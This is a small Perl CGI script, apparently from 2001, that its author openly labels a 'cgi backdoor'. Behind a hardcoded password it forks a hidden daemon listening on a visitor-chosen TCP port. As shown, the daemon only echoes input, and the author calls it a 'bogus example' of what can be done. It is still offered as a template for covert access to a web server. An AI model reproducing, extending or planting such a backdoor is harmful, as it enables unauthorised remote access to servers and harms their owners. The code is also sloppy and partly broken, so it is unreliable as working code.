#!/usr/bin/perl -T
# jerusalem (c) 2001
# heavily untested and on_the_fly done cgi (i've written this code on my
# organizer) - jerusalem@digitalmaphia.com / j3rus4lem@users.sourceforge.net
$password = "phj34r"; # as usual
## -note
## if you don't want to show your password in clear (in the sourcecode)
## use perl's crypt() function. a bogus example of this can be found
## into http://sgxxx.net/users/jerusalem/ulogin.pl *subliminal message*
use CGI qw/:standard/;
print header,
start_html('cgi backdoor - jerusalem\@digitalmaphia.com 2001'),
h1('cgi backdoor - jerusalem\@digitalmaphia.com 2001'),
start_form,
"password: ",password_field('pass'),p,
"port:     ",textfield('port'),
# if you want your pass shown in clear just subst the password_field() function
# with a textfield() one
submit,
end_form,
hr;
if (param()) {
$pass = "<EM>"."$password"."</EM>";
if (em(param('pass')) eq $pass) { werk(); } 
else { stfu(); }
sub stfu { print "password incorrect. sorry.\n"; }
hr;
}
# This subroutine is a little and bogus example of what you can do
# using a perl cgi. In this case, a daemon like the unix' echo is 
# started and forked under a pid.
sub werk {
$aaa = em(param('port'));
$aaa =~ s/<.*?>//g;
my $pid = fork(); if ($pid) { exit(); } 
yeha();
sub yeha {
use IO::Socket; 
my $port = $aaa;
my $socket = IO::Socket::INET->new(Listen => 5,
                                   LocalPort => $port, 
                                   Proto => 'tcp', 
                                   Reuse => 1);
while ($new = $socket->accept()) { $new->autoflush(1); command(); }
sub command { while (<$new>) { $comm = $_; chomp $comm;
print $new "$comm\n";
command(); } }
} 
}
